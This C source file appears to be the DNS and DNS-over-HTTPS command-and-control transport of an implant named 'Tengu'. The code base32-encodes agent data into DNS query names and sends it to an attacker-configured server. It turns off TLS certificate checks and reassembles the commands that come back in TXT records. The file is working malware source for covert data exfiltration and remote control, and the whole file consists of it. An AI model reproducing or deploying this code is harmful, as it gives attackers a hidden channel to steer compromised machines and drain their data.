#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <curl/curl.h>

#include "tengu.h"

// DNS/DoH C2 Transport for Tengu
//
// Protocol mirrors dns_codec.go on the teamserver:
//   Uplink   QNAME: <hdr_b32>.<d0_b32>[.<d1_b32>[.<d2_b32>]].domain
//   Header   9 bytes BE: [type:1][agentID:4][seq:2][tot:2]  -> 15 b32 chars
//   Data labels: 39 bytes each -> 63 b32 chars, max 3 labels -> 117 bytes/query
//   Downlink TXT: base32([is_last:1][data...])

#define DNS_CHUNK_MAX  117   // max raw bytes per uplink query
#define DNS_LABEL_MAX   39   // max raw bytes per QNAME label
#define DNS_TIMEOUT_S    5
#define DNS_RECV_BUF  4096

static const char B32[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

// ---- base32 -----------------------------------------------------------

static void b32_enc(const uint8_t* in, size_t in_len, char* out) {
    uint64_t acc = 0;
    int bits = 0;
    size_t o = 0;
    for (size_t i = 0; i < in_len; i++) {
        acc = (acc << 8) | in[i];
        bits += 8;
        while (bits >= 5) {
            bits -= 5;
            out[o++] = B32[(acc >> bits) & 0x1f];
        }
    }
    if (bits > 0)
        out[o++] = B32[(acc << (5 - bits)) & 0x1f];
    out[o] = '\0';
}

// Returns decoded length or -1 on error.
static int b32_dec(const char* in, uint8_t* out) {
    uint64_t acc = 0;
    int bits = 0, o = 0;
    for (const char* p = in; *p; p++) {
        char c = *p;
        int v = -1;
        if (c >= 'A' && c <= 'Z') v = c - 'A';
        else if (c >= 'a' && c <= 'z') v = c - 'a';
        else if (c >= '2' && c <= '7') v = c - '2' + 26;
        else return -1;
        acc = (acc << 5) | (uint64_t)v;
        bits += 5;
        if (bits >= 8) {
            bits -= 8;
            out[o++] = (uint8_t)((acc >> bits) & 0xff);
        }
    }
    return o;
}

// ---- DNS wire format --------------------------------------------------

// Write DNS labels for dot-separated name. Returns bytes written.
static int dns_write_labels(const char* name, uint8_t* buf, int cap) {
    int off = 0;
    const char* p = name;
    while (*p && off < cap - 1) {
        const char* dot = strchr(p, '.');
        int llen = dot ? (int)(dot - p) : (int)strlen(p);
        if (llen <= 0) { if (dot) { p++; continue; } break; }
        if (off + 1 + llen >= cap) break;
        buf[off++] = (uint8_t)llen;
        memcpy(buf + off, p, llen);
        off += llen;
        p += llen;
        if (*p == '.') p++;
    }
    buf[off++] = 0;
    return off;
}

// Build DNS TXT query with EDNS0. Returns wire length or -1.
static int dns_build_query(uint16_t txid, const char* qname,
                            uint8_t* buf, int cap) {
    if (cap < 512) return -1;
    int off = 0;
    buf[off++] = (uint8_t)(txid >> 8); buf[off++] = (uint8_t)txid;
    buf[off++] = 0x01; buf[off++] = 0x00; // RD=1
    buf[off++] = 0x00; buf[off++] = 0x01; // QDCOUNT=1
    buf[off++] = 0x00; buf[off++] = 0x00; // ANCOUNT=0
    buf[off++] = 0x00; buf[off++] = 0x00; // NSCOUNT=0
    buf[off++] = 0x00; buf[off++] = 0x01; // ARCOUNT=1 (EDNS0)

    off += dns_write_labels(qname, buf + off, cap - off);

    buf[off++] = 0x00; buf[off++] = 0x10; // QTYPE=TXT
    buf[off++] = 0x00; buf[off++] = 0x01; // QCLASS=IN

    // EDNS0 OPT record
    buf[off++] = 0x00;                                  // root label
    buf[off++] = 0x00; buf[off++] = 0x29;              // TYPE=OPT(41)
    buf[off++] = 0x10; buf[off++] = 0x00;              // UDP size=4096
    buf[off++] = 0x00; buf[off++] = 0x00;              // ext RCODE
    buf[off++] = 0x00; buf[off++] = 0x00;              // flags
    buf[off++] = 0x00; buf[off++] = 0x00;              // RDLENGTH=0

    return off;
}

// Skip a DNS name (labels or pointer). Returns new position.
static int dns_skip_name(const uint8_t* wire, int pos, int wlen) {
    while (pos < wlen) {
        uint8_t b = wire[pos];
        if (b == 0)          { pos++; break; }
        if ((b & 0xC0)==0xC0){ pos += 2; break; }
        pos += 1 + b;
    }
    return pos;
}

// Parse first TXT answer RDATA, b32-decode, return decoded bytes.
// Returns decoded length (>= 0) or -1. Caller frees *out.
static int dns_parse_txt(const uint8_t* wire, int wlen, uint8_t** out) {
    if (wlen < 12) return -1;
    if ((wire[2] & 0x80) == 0) return -1; // not a response
    if ((wire[3] & 0x0f) != 0) return -1; // RCODE != 0
    int ancount = ((int)wire[6] << 8) | wire[7];
    if (ancount == 0) return -1;

    int pos = 12;
    // skip question
    int qd = ((int)wire[4] << 8) | wire[5];
    for (int i = 0; i < qd && pos < wlen; i++) {
        pos = dns_skip_name(wire, pos, wlen);
        pos += 4; // QTYPE + QCLASS
    }

    // iterate answers
    for (int i = 0; i < ancount && pos < wlen; i++) {
        pos = dns_skip_name(wire, pos, wlen);
        if (pos + 10 > wlen) return -1;
        uint16_t rtype = ((uint16_t)wire[pos] << 8) | wire[pos+1];
        pos += 2 + 2 + 4; // TYPE, CLASS, TTL
        uint16_t rdlen = ((uint16_t)wire[pos] << 8) | wire[pos+1];
        pos += 2;
        if (pos + rdlen > wlen) return -1;

        if (rtype == 16) { // TXT
            // Concatenate TXT strings
            char b32buf[1024];
            int blen = 0;
            int rpos = pos, rend = pos + rdlen;
            while (rpos < rend) {
                uint8_t slen = wire[rpos++];
                int copy = (int)slen;
                if (rpos + copy > rend) break;
                if (blen + copy >= (int)sizeof(b32buf) - 1)
                    copy = (int)sizeof(b32buf) - 1 - blen;
                memcpy(b32buf + blen, wire + rpos, copy);
                blen += copy;
                rpos += slen;
            }
            b32buf[blen] = '\0';

            uint8_t* dec = malloc((size_t)blen * 5 / 8 + 4);
            if (!dec) return -1;
            int dec_len = b32_dec(b32buf, dec);
            if (dec_len < 0) { free(dec); return -1; }
            *out = dec;
            return dec_len;
        }
        pos += rdlen;
    }
    return -1;
}

// ---- QNAME builder ----------------------------------------------------

// Encode one C2 chunk as a QNAME (big-endian header matching Go server).
static void dns_build_qname(uint8_t msg_type, uint32_t agent_id,
                             uint16_t seq, uint16_t tot,
                             const uint8_t* data, size_t dlen,
                             const char* domain,
                             char* out, size_t out_cap) {
    uint8_t hdr[9];
    hdr[0] = msg_type;
    hdr[1] = (uint8_t)(agent_id >> 24); hdr[2] = (uint8_t)(agent_id >> 16);
    hdr[3] = (uint8_t)(agent_id >> 8);  hdr[4] = (uint8_t)(agent_id);
    hdr[5] = (uint8_t)(seq >> 8);       hdr[6] = (uint8_t)(seq);
    hdr[7] = (uint8_t)(tot >> 8);       hdr[8] = (uint8_t)(tot);

    char hdr_b32[16] = {0};
    b32_enc(hdr, 9, hdr_b32); // 9 bytes -> 15 chars

    int pos = snprintf(out, out_cap, "%s", hdr_b32);

    size_t doff = 0;
    while (doff < dlen && pos < (int)out_cap - 2) {
        size_t lsz = dlen - doff;
        if (lsz > DNS_LABEL_MAX) lsz = DNS_LABEL_MAX;
        char lbl[64] = {0};
        b32_enc(data + doff, lsz, lbl);
        pos += snprintf(out + pos, out_cap - pos, ".%s", lbl);
        doff += lsz;
    }
    snprintf(out + pos, out_cap - pos, ".%s", domain);
}

// ---- UDP exchange -----------------------------------------------------

static int dns_udp_exchange(const char* host, int port,
                             const uint8_t* qbuf, int qlen,
                             uint8_t* rbuf, int rcap) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return -1;

    struct sockaddr_in srv = {0};
    srv.sin_family = AF_INET;
    srv.sin_port   = htons((uint16_t)port);
    if (inet_pton(AF_INET, host, &srv.sin_addr) <= 0) {
        close(fd); return -1;
    }

    struct timeval tv = { .tv_sec = DNS_TIMEOUT_S, .tv_usec = 0 };
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    if (sendto(fd, qbuf, qlen, 0,
               (struct sockaddr*)&srv, sizeof(srv)) != (ssize_t)qlen) {
        close(fd); return -1;
    }
    int n = (int)recv(fd, rbuf, rcap, 0);
    close(fd);
    return n;
}

// ---- DoH curl ---------------------------------------------------------

typedef struct { uint8_t* data; size_t len; } CurlResp;

static size_t doh_write_cb(void* ptr, size_t sz, size_t n, void* ud) {
    CurlResp* r = (CurlResp*)ud;
    size_t total = sz * n;
    uint8_t* tmp = realloc(r->data, r->len + total + 1);
    if (!tmp) return 0;
    r->data = tmp;
    memcpy(r->data + r->len, ptr, total);
    r->len += total;
    return total;
}

// POST DNS wire query to DoH endpoint, parse TXT response.
// Returns decoded length or -1. Caller frees *out.
static int doh_query(const uint8_t* qwire, int qlen, uint8_t** out) {
    const char* host   = g_config.dns_host;
    int         port   = g_config.dns_port;
    const char* path   = g_config.doh_path ? g_config.doh_path : "/dns-query";
    const char* scheme = g_config.doh_secure ? "https" : "http";

    char url[512];
    snprintf(url, sizeof(url), "%s://%s:%d%s", scheme, host, port, path);

    CurlResp resp = {0};
    CURL* curl = curl_easy_init();
    if (!curl) return -1;

    struct curl_slist* hdrs = NULL;
    hdrs = curl_slist_append(hdrs, "Content-Type: application/dns-message");
    hdrs = curl_slist_append(hdrs, "Accept: application/dns-message");

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hdrs);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, (char*)qwire);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)qlen);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, doh_write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &resp);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, (long)DNS_TIMEOUT_S * 2);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    CURLcode rc = curl_easy_perform(curl);
    curl_slist_free_all(hdrs);
    curl_easy_cleanup(curl);

    if (rc != CURLE_OK || !resp.data || resp.len == 0) {
        free(resp.data);
        return -1;
    }

    int dec_len = dns_parse_txt(resp.data, (int)resp.len, out);
    free(resp.data);
    return dec_len;
}

// ---- Core C2 logic ----------------------------------------------------

// Send one frame over DNS or DoH. Collects the full reassembled response.
// use_doh: 0=UDP DNS  1=DoH
static int c2_post_impl(const uint8_t* body, size_t body_len,
                         uint8_t** resp_out, size_t* resp_len_out,
                         int use_doh) {
    *resp_out = NULL;
    *resp_len_out = 0;

    const char* domain = g_config.dns_domain;
    if (!g_config.dns_host || !domain) return -1;

    uint16_t tot = (uint16_t)((body_len + DNS_CHUNK_MAX - 1) / DNS_CHUNK_MAX);
    if (tot == 0) tot = 1;

    static uint16_t s_txid = 0;

    uint8_t qbuf[512];
    uint8_t rbuf[DNS_RECV_BUF];
    char qname[256];

    uint8_t* accum = NULL;
    size_t   accum_len = 0;

    for (uint16_t seq = 0; seq < tot; seq++) {
        size_t off = (size_t)seq * DNS_CHUNK_MAX;
        size_t csz = body_len - off;
        if (csz > DNS_CHUNK_MAX) csz = DNS_CHUNK_MAX;

        dns_build_qname(0x01, g_agent_id, seq, tot,
                        body + off, csz, domain, qname, sizeof(qname));

        uint16_t txid = ++s_txid;
        uint8_t* decoded = NULL;
        int dec_len;

        if (use_doh) {
            int qlen = dns_build_query(txid, qname, qbuf, sizeof(qbuf));
            if (qlen < 0) goto fail;
            dec_len = doh_query(qbuf, qlen, &decoded);
        } else {
            int qlen = dns_build_query(txid, qname, qbuf, sizeof(qbuf));
            if (qlen < 0) goto fail;
            int rlen = dns_udp_exchange(g_config.dns_host,
                                        g_config.dns_port ? g_config.dns_port : 53,
                                        qbuf, qlen, rbuf, sizeof(rbuf));
            if (rlen <= 0) goto fail;
            dec_len = dns_parse_txt(rbuf, rlen, &decoded);
        }

        if (dec_len < 1) { free(decoded); goto fail; }

        uint8_t is_last = decoded[0];
        int data_len = dec_len - 1;

        if (data_len > 0) {
            uint8_t* tmp = realloc(accum, accum_len + (size_t)data_len);
            if (!tmp) { free(decoded); goto fail; }
            accum = tmp;
            memcpy(accum + accum_len, decoded + 1, data_len);
            accum_len += data_len;
        }
        free(decoded);

        // After last uplink chunk: poll until is_last=1
        if (seq == tot - 1) {
            while (!is_last) {
                dns_build_qname(0x00, g_agent_id, 0, 0, NULL, 0,
                                domain, qname, sizeof(qname));
                txid = ++s_txid;
                decoded = NULL;

                if (use_doh) {
                    int qlen = dns_build_query(txid, qname, qbuf, sizeof(qbuf));
                    if (qlen < 0) goto fail;
                    dec_len = doh_query(qbuf, qlen, &decoded);
                } else {
                    int qlen = dns_build_query(txid, qname, qbuf, sizeof(qbuf));
                    if (qlen < 0) goto fail;
                    int rlen = dns_udp_exchange(g_config.dns_host,
                                               g_config.dns_port ? g_config.dns_port : 53,
                                               qbuf, qlen, rbuf, sizeof(rbuf));
                    if (rlen <= 0) goto fail;
                    dec_len = dns_parse_txt(rbuf, rlen, &decoded);
                }

                if (dec_len < 1) { free(decoded); goto fail; }

                is_last = decoded[0];
                data_len = dec_len - 1;

                if (data_len > 0) {
                    uint8_t* tmp = realloc(accum, accum_len + (size_t)data_len);
                    if (!tmp) { free(decoded); goto fail; }
                    accum = tmp;
                    memcpy(accum + accum_len, decoded + 1, data_len);
                    accum_len += data_len;
                }
                free(decoded);
            }
        }
    }

    *resp_out = accum;
    *resp_len_out = accum_len;
    return 0;

fail:
    free(accum);
    return -1;
}

int dns_c2_post(const uint8_t* body, size_t body_len,
                uint8_t** resp_out, size_t* resp_len_out) {
    return c2_post_impl(body, body_len, resp_out, resp_len_out, 0);
}

int doh_c2_post(const uint8_t* body, size_t body_len,
                uint8_t** resp_out, size_t* resp_len_out) {
    return c2_post_impl(body, body_len, resp_out, resp_len_out, 1);
}
